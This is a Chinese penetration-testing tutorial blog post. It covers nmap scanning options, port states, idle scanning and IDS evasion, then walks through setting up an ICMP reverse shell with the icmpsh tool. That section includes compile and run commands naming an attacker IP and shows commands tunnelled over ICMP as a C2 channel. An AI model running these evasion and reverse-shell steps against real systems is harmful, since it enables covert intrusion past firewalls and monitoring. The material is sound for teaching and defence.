知识触发战技，战技刻意练习得到经验，经验反思源头，得到创新力。我们需要模仿与练习。 -----sec875

## nmap

比战技更重要的是源头的查阅，此意识可以让大脑保持在舒适区且命中根源。

为什么这件事情很重要？why？因为您无法保证自己学到的东西永远都用于工作，它会健忘掉。

 **提前说明** ：官方手册，man手册，帮助命令等都是用于辅佐，不存在谁比谁权威，全。请自己思考并取舍。并放弃一劳永逸的想法。

请确保能找到官方手册和利用man nmap。

https://nmap.org/

### 找到nmap 功能性参数 还是 记住开关的flag？

![image](https://image.3001.net/images/20210728/1627480412_6101615c9e17fda6682b2.png!small)

### 主机发现

基于ICMP的主机发现 还是 端口响应包的预期值主机发现？不，还能将意识提升到基于SYN和ACK几个步骤中的具体发哪一种包，刻意的改包和重放来主机发现。

【注意】：这里不会引申出更丰富的网络包修改，重放与基线防御配置。因为它们于我的工作量过于巨大。您知道，寻找这一处容易，但此文章一旦开头就得所有。因此，我将给出地方，防御配置不在这里讨论与观察：https://www.scaprepo.com/
CCE编号为国际防御配置基准线。尽力了，师傅们。

    
    
    -sL (列表扫描)，-sP (Ping扫描)，-P0 (无ping)，-PS [portlist] (TCP SYN Ping)，-PA [portlist] (TCP ACK Ping)，-PU [portlist] (UDP Ping)，-PE; -PP; -PM (ICMP Ping Types)，-PR (ARP Ping)，-n (不用域名解析) ，-R (为所有目标解析域名) ，--system-dns (使用系统域名解析器) 
    

举一个例子，足以说明这种战技的观察力与创造力，使用-sP发送ping扫描。它发送了什么网络包？我以后使用网络包修改与重放修改哪里？哪些预期结果可以确认主机的存活？

129为kali机器。因为提前读过文档，知道它会发一个ICMP echo的请求包与TCP
80（root特权）请求包用于探测。得到的主机存活响应包也回复了一个ICMP echo 响应包并且回复了一个TCP 80
RST响应包。所以，我们知道此主机确实是在的。

不妨思考一下，ICMP的type 8类型（以及其他协议字段值？RFC文档看看哪些处于实验期？）修改成别的？TCP 80端口改改？

![image](https://image.3001.net/images/20210728/1627480444_6101617ca7141d71ff165.png!small)

![image](https://image.3001.net/images/20210728/1627480457_61016189de3530e36579f.png!small)

这就是为什么，会存在其他方式与参数来尝试性的看看响应，设备会不会出现意外的响应包？或者意外的情况？

![image](https://image.3001.net/images/20210728/1627480473_610161994722f515672f2.png!small)

### 端口扫描基础

open(开放的)， closed(关闭的)，filtered(被过滤的)， unfiltered(未被过滤的)，
open|filtered(开放或者被过滤的)，或者 closed|filtered(关闭或者被过滤的)

nmap的信息细节颗粒度更多。它的意识提升到了，很多复杂情况性的思考，不同响应包的情况。我们需要掌握此处，用于以后进阶其他技术材料。

该端口接收TCP连接或者UDP报文，说明它正在工作，那么主机自然是存活的。 **open(开放的)**

因为没有应用程序在其端口上监听，因此状态是 **closed(关闭的)**
，这种影响可能是丢包，抖动或者暂时性的不监听。所以，值得再扫描一下，可能一些又开放了。

 **filtered(被过滤的)** ：包阻塞器或者防火墙会丢弃包，或者响应ICMP错误消息如类型3代码13 (无法到达目标:
通信被管理员禁止)。nmap会多次尝试，使得扫描速度明显变慢。基于这种慢于快的基准，也能帮助我们识别是否存在阻塞与防火墙。

 **unfiltered(未被过滤的)**
：端口可访问，但Nmap不能确定它是开放还是关闭。发送ACK请求包的探测才会被分类到此状态，还需要使用其他类型，如窗口扫描，SYN扫描，或者FIN扫描来扫描未被过滤的端口，进一步确认端口是否开放。

 **open|filtered(开放或者被过滤的)** ：无法确定端口是开放还是被过滤的，Nmap就把该端口划分成 这种状态。比如使用UDP，IP协议，
FIN，Null，和Xmas扫描时，没有响应包回来。这对于UDP也许是开放的，但也可能被防火墙设备丢弃了。

 **closed|filtered(关闭或者被过滤的)** ：注意man手册与官方文档中的一些差异性。Idle扫描为空闲态扫描。

【请记住】：所有的情况都是基于响应包的结果来判断状态的。这些状态结果与目标主机也许不可信，它们返回迷惑性响应包迷惑了nmap，更普遍的是非RFC兼容的主机以不正确的方式响应Nmap探测。您知道，RFC文档只是协议的标准，具体产品的实现存在着差异性。我们可以观察具体的响应包来确认。比如您修改了某一项值，但是它在RFC文档中标记为盲区，响应包返回错误，或者不支持该值。那么机会就来，它确实存在但是仅仅是不支持而已？想想与类比burpsutie的抓包与重放，都是一个道理与观察得到的。

![image](https://image.3001.net/images/20210728/1627480498_610161b2b0ab6e4d68d9c.png!small)

### 端口扫描技术

一个很好的例子是 -sW (TCP窗口扫描)，它的请求包篡改了不同系统对于TCP窗口值的值不同，响应包返回了窗口的大小还是0。

![image](https://image.3001.net/images/20210728/1627480515_610161c358d1d01c6e060.png!small)

基于这个例子，可以把大家带入到就和burpsutie的使用一样，就是修改值然后观察不同的响应包情况来判断，有或者没有。这不过这里把burpsutie换一个网络包的修改与重放工具罢了。思维同源。

其他开关自行阅读文档。

### TCP IPID Idle空闲态扫描 ( -sI)

互联网上的每个IP包都有一个片段身份号码（IP ID）。由于许多操作系统只是为他们发送的每个数据包增加这个数字，探测IPID
可以告诉攻击者已经发送了多少数据包自上次探测。

这种侧信道攻击技巧，源于一种思考，我把源IP地址改改，别人不就不清楚我是谁呢？改成它们信任的IP地址？入侵检测系统 (IDS)的记录将全都是错的。

![image](https://image.3001.net/images/20210728/1627480534_610161d69fdf5d1f3eafe.png!small)

不要说什么看不懂和还没有成熟。一个TCP包中的IPID到底在哪里？它有那么难找吗？它在什么工具中？

观察一下IPID

![image](https://image.3001.net/images/20210728/1627480549_610161e5a3ec089da8cf8.png!small)

### 服务和版本探测

当端口探测结束后，版本探测会继续询问这些端口，确定到底什么服务正在运行。

/usr/share/nmap/ 在nmap文件夹中

基于nmap-services数据库的匹配结果，给出具体的端口服务，比如22端口为什么是SSH？

![image](https://image.3001.net/images/20210728/1627480570_610161fa3fd67c6f492e1.png!small)

它又是怎么识别版本的？ 基于nmap-service-probes数据库的匹配表达式。

![image](https://image.3001.net/images/20210728/1627480588_6101620c313297c931945.png!small)

那它把ssh的22端口改成非默认的不行吗？这就是为什么再加上一个版本探测进来的原因。我都匹配到了你SSH版本的信息了，还不能确认你是SSH服务吗？

您想给nmap做贡献吗？这绝对是一件有意义的事情。

![image](https://image.3001.net/images/20210728/1627480604_6101621c550bb233c0d85.png!small)

### 操作系统探测

![image](https://image.3001.net/images/20210728/1627480620_6101622cc4c9481fea5ed.png!small)

### Nmap 脚本引擎 (NSE)

关于脚本的使用，需要注意到文件名的分类性，还有安全或者不安全的脚本分类。在基于了解情况的使用脚本是一种很好的意识思维。不要让一切都失控。

![image](https://image.3001.net/images/20210728/1627480635_6101623b6d6a6a4fdfb3d.png!small)

### 时间和性能

有人说nmap很慢，那么这里的开关可以与其他工具的速度比一比

![image](https://image.3001.net/images/20210728/1627480651_6101624b607f075599940.png!small)

### 防火墙/IDS bypass与欺骗

要清楚的是，这里也能伪装一些元数据信息。当然，这里的方法已经众所周知，需要基于这里的思维，寻找和测试其他的攻击向量。或者说是其他角度的键与值。

![image](https://image.3001.net/images/20210728/1627480666_6101625a838db9d84313e.png!small)

到了这里，您应该对官方文档和man手册有一个很好的熟悉度。

## ICMP 反向shell

netcat常用于渗透测试中的getshell工具之一。还有很多流行的shell文件，Reverse TCP Meterpreter、C99 PHP web
shell、JSP web shell等

这里就不讲netcat shell了，因为man netcat解决一切问题。观察与翻译一下说明，马上就能明白功能项开关的意思。

这里聊聊一种场景。进出服务器的通信受到防火墙的保护和过滤，并且不允许在任何侦听端口上进行 TCP shell 通信。
那么基于TCP的绑定shell与反向shell自然就不成立了。

但是许多环境又允许发送和接收 ping 请求，用于故障诊断的需求。 Ping 请求于 ICMP 协议中。

我们知道ICMP的data字段，请求包是什么值，响应包就返回什么值回来。如果不一致则说明确实存在故障了。

![image](https://image.3001.net/images/20210728/1627480685_6101626d45e6dd8ea0699.png!small)

![image](https://image.3001.net/images/20210728/1627480700_6101627c14c3cbefd0e90.png!small)

https://github.com/interference-security/icmpsh 搭建icmp隧道服务器

icmpsh_m.py 用于服务器 C语言编译或者exe用于客户端

安装 MingW与编译C文件

    
    
    i686-w64-mingw32-gcc icmp-slave-complete.c -o icmp-slave-complete.exe 
    

也可以都从这里下载

![image](https://image.3001.net/images/20210728/1627480717_6101628db208afd7bfc06.png!small)

服务器端部署，客户端运行exe

    
    
    sysctl -w net.ipv4.icmp_echo_ignore_all=1 >/dev/null 
    ./icmpsh_m.py <attacker_ip> <target_ip>
    

![image](https://image.3001.net/images/20210728/1627480731_6101629b706dd61febae0.png!small)

提示，需要安装Impacket依赖

    
    
    man pip
    pip install impacket -I
    

![image](https://image.3001.net/images/20210728/1627480748_610162ac1f11fae1dc8dc.png!small)

-I 参数，忽略已安装的包，重新安装。注意脚本的相对路径放置的位置。

![image](https://image.3001.net/images/20210728/1627480762_610162ba102fa80bb3471.png!small)

观察源码发现调用了impacket包中的很多API接口函数，它本身不会自动定位与寻找，不存在URL，绝对路径或者相对路径的机制来帮助它定位API函数的调用。因此您不能将脚本随便放置，不然会出现一些误导性质的报错。

![image](https://image.3001.net/images/20210728/1627480777_610162c9c62029244bdda.png!small)

![image](https://image.3001.net/images/20210728/1627480792_610162d819ea936abf30d.png!small)

![image](https://image.3001.net/images/20210728/1627480806_610162e610afa91974423.png!small)

发送命令观察ICMP隧道

![image](https://image.3001.net/images/20210728/1627480821_610162f50c7a138efacac.png!small)

kail下发的命令ipconfig

![image](https://image.3001.net/images/20210728/1627480836_610163047f1d150f45e48.png!small)

客户端返回的结果。种种迹象表白，data字段被用于C2隧道。请求与响应在data中完全的不一致。

![image](https://image.3001.net/images/20210728/1627480852_61016314252c999fc33f4.png!small)

https://www.moonsec.com/archives/3066 这里有一篇文章提及到报错信息。但是本质上还是路径问题。

感谢师傅们很有耐心的看到了这里。

我们还会再见面的。

共勉。

